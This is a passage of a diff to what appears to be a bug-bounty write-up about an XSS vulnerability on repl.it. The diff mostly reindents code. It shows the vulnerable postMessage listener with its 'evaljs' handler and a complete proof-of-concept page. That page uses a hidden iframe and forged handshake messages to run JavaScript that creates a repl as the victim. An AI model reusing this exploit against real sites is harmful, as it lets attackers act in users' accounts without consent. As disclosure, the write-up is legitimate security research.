@@ -35,16 +35,14 @@ Now let's start looking at the actual XSS vulnerability. The `/public/secure` pa
 var listeners = { load: s, evaljs: a, html: i };
 var secret;
 window.addEventListener("message", function(event) {
-	var req = JSON.parse(event.data);
-	if (req.secret) {
-		if (secret || "handshake" !== req.type) {
-			if (req.secret !== secret) return;
-			if (!listeners[req.type]) 
-				throw Error("No listeners for event:"
-                                             + req.type);
-			listeners[req.type](req.data);
-		} else secret = req.secret;
-	}
+  var req = JSON.parse(event.data);
+  if (req.secret) {
+    if (secret || "handshake" !== req.type) {
+      if (req.secret !== secret) return;
+      if (!listeners[req.type]) throw Error("No listeners for event:" + req.type);
+      listeners[req.type](req.data);
+    } else secret = req.secret;
+  }
 })
 ```
 
@@ -58,22 +56,19 @@ As I continued to mess around, I started to notice the similarities between the 
 <iframe style="position:absolute;left:-100000px;" id="repl" src="https://repl.it/public/secure"></iframe>
 <script>
 function createRepl(){
-	var xhr = new XMLHttpRequest();
-	xhr.open("POST", 'https://repl.it/data/repls/new');
-	xhr.setRequestHeader("Content-Type", "application/json");
-	xhr.send(JSON.stringify({language: "python3", title: "kmh was here " + Math.floor(Math.random()*1000000), folderId: "", isPrivate: false, description: ""}));
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", 'https://repl.it/data/repls/new');
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.send(JSON.stringify({language: "python3", title: "kmh was here " + Math.floor(Math.random()*1000000), folderId: "", isPrivate: false, description: ""}));
 }
 setTimeout(function() {
-	repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "handshake"}), "*");
-	setTimeout(function() {
-		repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "load"}), "*")
-		setTimeout(function() {
-			repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "evaljs", data: createRepl.toString()+";createRepl()"}), "*")
-			setTimeout(function() {
-				location.href = "https://repl.it/repls"
-			}, 20000000)
-		}, 200)
-	}, 200);
+  repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "handshake"}), "*");
+    setTimeout(function() {
+      repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "load"}), "*")
+        setTimeout(function() {
+          repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "evaljs", data: createRepl.toString()+";createRepl()"}), "*")
+        }, 200)
+    }, 200);
 }, 200);
 </script>
 ```
